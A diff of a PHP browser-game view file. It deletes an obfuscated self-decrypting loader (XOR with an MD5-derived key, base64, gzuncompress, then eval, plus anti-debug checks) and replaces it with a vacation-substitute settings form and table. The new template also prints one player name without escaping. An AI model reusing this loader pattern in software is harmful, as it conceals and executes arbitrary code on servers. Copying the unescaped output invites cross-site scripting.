@@ -1,24 +1,40 @@
-<?php
-$ndtvjwmf="b3e1f5ed1df3c715466ce13df143ef0a";
-$puesza="555107535e565c0057010357000e0454500101515d06515707540d0257555604";
-$iopsdfefey="T7jPNvkNpVR22CKuXIFja9+wW2DN4aDBYFjdMpA7f1mbz3jSyCPyuwHZJb0Piy7TzRIzLMvp0eytXWvuhWJ01gM/50xXYxPTF+XNz/5yDvBv40KHebpk8VQuj+AvMsjKFdliR7m1jZG5RrN29/lwvPB700wZ0Vlio6MTqkbpftS0unG9tPD+NK2V7NSiGSYuTnZuebAQy1NFlpZ/EjcMBWbdw0UI3IcGUi8lMaih7rtF6DmDMHIEs4QjASbBfd0MVjquCOF8PeIGFnF9wUu0Qsr6K0vh1QYVwCtJ2PiFrk8FRYRRtFDVSSN1m0YEpAVMKYuZ8OoPaYp3Q26TQ5j9LAP/s05xO4EzgAqs2tii5MRoHHH9lbMghwe7/vKdWh1BbgiQmjUpM3mcIrZn7FDTsoU82/wv/jId+GJ9OOc7tWBsH+OwWhxJJEuyjnsXkWZ4AUiDdi3EDcSWOhZ/nYlO2N0QTHY1HadiTJwc9sKCe5B4UsOvJibN0LI1NCUtjmkRYrbLV5rkH7QUmRJK70Sc3mjNoegncx6DZjuJebND2OZYrROfX3T3u+zczRZTxucYGA4ZmZrOeKoqBJiyeWgYutZGx+mnJ8ZoFQ+wCA==";
-$uyhlbntfg=file_get_contents(__FILE__);
-$gxozyxwls=str_replace($iopsdfefey,"",$uyhlbntfg);
-if(strpos($gxozyxwls,"ec"."ho")!==false||strpos($gxozyxwls,"pr"."int")!==false||strpos($gxozyxwls,"var_"."dump")!==false||strpos($gxozyxwls,"file_put_"."contents")!==false||strpos($gxozyxwls,"fw"."rite")!==false){die();}
-$odjezvfo=str_replace(array($ndtvjwmf,$puesza),array("SP_63dc3771","KP_e99d1a39"),$uyhlbntfg);
-$eljoxpj=md5($odjezvfo);
-$wfgrsyupv=hex2bin($puesza);
-$tvnvsgbr="";
-$ejlwidp=strlen($eljoxpj);
-for($vhmzgsbjt=0;$vhmzgsbjt<$ejlwidp;$vhmzgsbjt++){
-$tvnvsgbr.=chr(ord($wfgrsyupv[$vhmzgsbjt])^ord($eljoxpj[$vhmzgsbjt]));
-}
-$htvchjme=base64_decode($iopsdfefey);
-$ygkmecmx=strlen($htvchjme);
-$imsazvtg="";
-$lburwun=strlen($tvnvsgbr);
-for($vhmzgsbjt=0;$vhmzgsbjt<$ygkmecmx;$vhmzgsbjt++){
-$imsazvtg.=$htvchjme[$vhmzgsbjt]^$tvnvsgbr[$vhmzgsbjt%$lburwun];
-}
-$eihvfvun="gzun"."compress";
-eval('?>' . $eihvfvun($imsazvtg) . '<?php ');
+<h3><?= __('screens.settings_vacation.title') ?></h3>
+<p><?= __('screens.settings_vacation.description') ?></p>
+
+<form action="game.php?village=<?= $village['id'] ?>&screen=settings&mode=vacation&action=activate&h=<?= $hkey ?>"
+    method="post">
+    <table class="vis">
+        <tbody>
+            <tr>
+                <td><?= __('screens.settings_vacation.substitute') ?></td>
+                <td><input name="substitute" type="text" value="<?= htmlspecialchars($vacation_substitute ?? '') ?>">
+                </td>
+                <td><input class="btn btn-default" value="OK" type="submit"></td>
+            </tr>
+        </tbody>
+    </table>
+</form>
+
+<br>
+<?php if (!empty($vacation_id)): ?>
+    <table class="vis" width="100%">
+        <tbody>
+            <tr>
+                <th><?= __('screens.settings_vacation.substitute') ?></th>
+                <th><?= __('screens.settings_vacation.start') ?></th>
+                <th><?= __('screens.settings_vacation.end') ?></th>
+                <th><?= __('screens.settings_vacation.action') ?></th>
+            </tr>
+            <tr>
+                <td><a
+                        href="game.php?village=<?= $village['id'] ?>&screen=info_player&id=<?= $vacation_id ?>"><?= $vacation_name ?></a>
+                </td>
+                <td><?= $vacation_date ?></td>
+                <td>-</td>
+                <td><a
+                        href="game.php?village=<?= $village['id'] ?>&screen=settings&mode=vacation&action=cancel_vacation&h=<?= $hkey ?>"><?= __('screens.settings_vacation.end_substitution') ?></a>
+                </td>
+            </tr>
+        </tbody>
+    </table>
+<?php endif; ?>
